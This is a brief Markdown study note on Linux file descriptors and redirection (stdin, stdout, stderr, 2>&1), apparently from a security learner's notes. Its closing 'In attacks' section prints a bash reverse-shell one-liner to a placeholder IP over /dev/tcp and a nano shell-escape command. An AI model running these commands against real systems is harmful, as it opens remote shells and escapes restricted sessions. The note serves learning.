---
tags: [basics, linux]
aliases: [File Descriptors, Streams, Redirects]
---
# File Descriptors & Redirects

> Every process has three standard channels (file descriptors). Redirecting them is the basis of reverse-shell payloads and shell escapes.

## The three channels
| No.   | Name   | Meaning                           | Default    |
| ----- | ------ | --------------------------------- | ---------- |
| **0** | stdin  | input – what comes in             | keyboard   |
| **1** | stdout | normal output – the result        | screen     |
| **2** | stderr | error output – errors/warnings    | screen     |

## Redirecting (`>`)
`>` means "send this channel somewhere else". The number **before it** says *which*:
- `1>` → redirect stdout (= just `>`, since 1 is the default)
- `2>` → redirect stderr
- `>&` → stdout **and** stderr together
- `&1` / `&0` → "to wherever channel 1 / 0 already points"

| Expression | Meaning                                                 |
| ---------- | ------------------------------------------------------- |
| `2>&1`     | send stderr to wherever stdout points                   |
| `>& /dev/tcp/<IP>/<PORT>` | stdout+stderr to the network (reverse shell) |
| `0>&1`     | stdin from the same source as stdout (network)          |
| `1>&0 2>&0` | stdout+stderr back to the terminal (stdin) → interactive shell |

## In attacks
```bash
# Reverse shell: all three channels over the TCP connection
bash -i >& /dev/tcp/<IP>/4444 0>&1
```
```bash
# nano/GTFOBins shell escape (everything to the terminal)
reset; sh 1>&0 2>&0
```
